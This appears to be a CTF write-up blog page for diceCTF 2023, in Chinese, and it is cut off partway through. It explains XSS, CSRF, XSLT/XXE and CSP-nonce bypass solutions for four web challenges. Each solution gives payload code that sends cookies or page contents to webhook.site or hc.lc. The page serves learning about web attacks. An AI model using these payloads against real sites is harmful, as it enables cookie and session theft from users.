@@ -1,0 +1,443 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>an4er&#39; blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../avatar.jpg"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        an4er
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    Want to be a Ctfer, Developer, Red Team
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/an5er" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-2">
+        <div class="mb-3">
+            <h3 class="mb-0">diceCTF2023 WP</h3>
+            
+            <small class="text-muted">Published February 12, 2023</small>
+        </div>
+
+        <article>
+            <h2 id="jnotes">jnotes</h2>
+<p>题目总体代码很短，有一个XSS的点，flag在cookie中，被设置为httpOnly，所以目的是偷取cookie。</p>
+<p>因为唯一的回显点在后端会输出note这个cookie的值到前端，我们才能获得，所以突破点在后端，后端就是一个简单的javalin程序，我最后的尝试是想能不能根据编码的差别在存储cookie时，设置类似<code>;</code>的符号去混乱cookie的键值对，尝试失败，会抛出RFC协议不允许<code>；</code>作为cookie的值，后来也看了下javalin关于cookie的文档和源码调试，没发现啥点</p>
+<p>复现发现javalin是基于jetty的，靠了、光顾着看javalin没看jetty。在<code>/jetty-http/src/main/java/org/eclipse/jetty/http/CookieCutter.java</code>中，看到了jetty是这么解析接收到的cookie的，如果遇到<code>&quot;</code>，则到<code>&quot;</code>结束的当作一个值</p>
+<p>因为note也是httpOnly的，所以也无法使用js去设置它的值，这里利用<code>document.cookie='=note=&quot;;path=//';</code>创建键为空，值为note的cookie，发送时也就是 <code>note=&quot;....</code>这里为了让note在最前面以可以覆盖掉后面的值所以让path的路径较长与FLAG</p>
+<blockquote>
+<ul>
+<li>Cookies with longer path are listed before cookies with shorter path.</li>
+<li>Cookies which are edited least recently are listed before cookies which are edited most recently.</li>
+</ul>
+</blockquote>
+<p>引用及payload来自<a href="https://github.com/RohitNarayananM/blog/tree/main/dicectf23-writeups/jnotes">https://github.com/RohitNarayananM/blog/tree/main/dicectf23-writeups/jnotes</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://jnotes.mc.ax/create&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;p&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> &gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#p&#34;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;/textarea&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;\x73cript&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      document.cookie=&#39;=note=&#34;;path=//&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      const frame = document.createElement(&#39;iframe&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      frame.src = &#34;https://jnotes.mc.ax//&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      document.body.appendChild(frame);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      frame.onload = () =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        navigator.sendBeacon(&#34;https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720&#34;,frame.contentWindow.document.body.innerHTML);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/\x73cript&gt;`</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>offical <a href="https://blog.ankursundara.com/dicectf23-writeups/">https://blog.ankursundara.com/dicectf23-writeups/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://jnotes.mc.ax/create&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;p&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#p&#34;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;/textarea&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;\x73cript&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      if (window.location.pathname !== &#34;//&#34;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.cookie = &#39;note=; Max-Age=-1&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.cookie = &#39;=note=&#34;uhhh; path=//&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.cookie = &#39;END=ok&#34; ; path=&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        w = window.open(&#39;https://jnotes.mc.ax//&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        setTimeout(()=&gt;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ex = w.document.body.innerHTML;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          navigator.sendBeacon(&#39;https://hc.lc/log2.php&#39;, ex);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }, 500);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/\x73cript&gt;`</span>;
+</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h2 id="gift">gift</h2>
+<p>赛后学习@deltaclock师傅的思路，估计是非预期，就两步</p>
+<p>利用<code>admin</code>身份创建<code>gift</code></p>
+<pre tabindex="0"><code>window.open(&#34;https://gift.mc.ax/create/Infinity&#34;);
+</code></pre><p>在创建加载的时候登录，目的是更改用户名，因为生成<code>create</code>界面的时候会再次发送请求到<code>/api/info</code>获得用户名，但是<code>public</code>是使用<code>admin</code>创建的，然后又用户名存在html注入，所以存在外带的可能性</p>
+<p>对着大佬的poc改改（删了一些没有影响的东西方便理解 如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Document&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://gift.mc.ax/api/login&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;json&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#34;}&#39;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">noscript</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;meta&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">base</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.com/&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0; url=URL&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">noscript</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">make_csrf</span>(<span style="color:#a6e22e">html_payload</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">html_payload</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">junk</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">csrf</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">csrf</span>.<span style="color:#a6e22e">firstElementChild</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">make_payload</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;leak&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">meta</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;meta&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">meta</span>.<span style="color:#a6e22e">innerHTML</span>.<span style="color:#a6e22e">trim</span>().<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">`URL&#34;&gt;`</span>, <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span> =&gt; <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">d</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#34;leak&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">sendBeacon</span>(<span style="color:#e6db74">&#34;https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720&#34;</span>,<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#34;pay&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_payload</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">make_csrf</span>(<span style="color:#a6e22e">html</span>);
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf&#34;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pay</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#e6db74">}</span><span style="color:#e6db74">?pay=yes`</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">main</span>();
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>然后获得邀请链接，创建个账户使用后访问/flag即可</p>
+<h2 id="impossible-xss">impossible-xss</h2>
+<p>bot使用<code>.setJavaScriptEnabled</code>禁止js的执行</p>
+<pre tabindex="0"><code>await page.setJavaScriptEnabled(false);
+</code></pre><p><code>res.end</code>相较于<code>res.send</code>不会返回<code>Content-Type</code></p>
+<blockquote>
+<p>This means chrome will perform content sniffing on the response.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">xmls</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE a [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   &lt;!ENTITY xxe SYSTEM  &#34;https://impossible-xss.mc.ax/flag&#34; &gt;]&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;xsl:stylesheet xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34; version=&#34;1.0&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;xsl:template match=&#34;/asdf&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;HTML&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;HEAD&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;TITLE&gt;&lt;/TITLE&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/HEAD&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;BODY&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;img&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;xsl:attribute name=&#34;src&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720/?&amp;xxe;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;/xsl:attribute&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/img&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/BODY&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/HTML&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/xsl:template&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/xsl:stylesheet&gt;`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xml</span><span style="color:#f92672">=</span><span style="color:#e6db74">`&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?xml-stylesheet type=&#34;text/xsl&#34; href=&#34;data:text/plain;base64,</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xmls</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;asdf&gt;&lt;/asdf&gt;`</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xss</span><span style="color:#f92672">=</span>encodeURIComponent(<span style="color:#a6e22e">xml</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;https://impossible-xss.mc.ax/?xss=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">xss</span>)
+</span></span></code></pre></div><h2 id="recursive-csp">recursive-csp</h2>
+<p>csp中</p>
+<pre tabindex="0"><code>script-src &#39;nonce-$nonce&#39;
+</code></pre><p>如下可以绕过CSP，其中的<code>nonce</code>要和整个js语句hash出来的<code>nonce</code>相等</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>script nonce<span style="color:#f92672">=&#39;</span><span style="color:#a6e22e">ZZZZZZZZ</span><span style="color:#f92672">&#39;&gt;</span>alert(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">crc</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#34;crc/crc32&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;e8b7be43&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;script nonce=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">target</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;location.href=&#39;https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720&#39;+document.cookie&lt;/script&gt;`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">printables</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&#34;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~ \t\n\r\x0b\x0c&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">a</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">printables</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">b</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">printables</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">c</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">printables</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">d</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">printables</span>) {
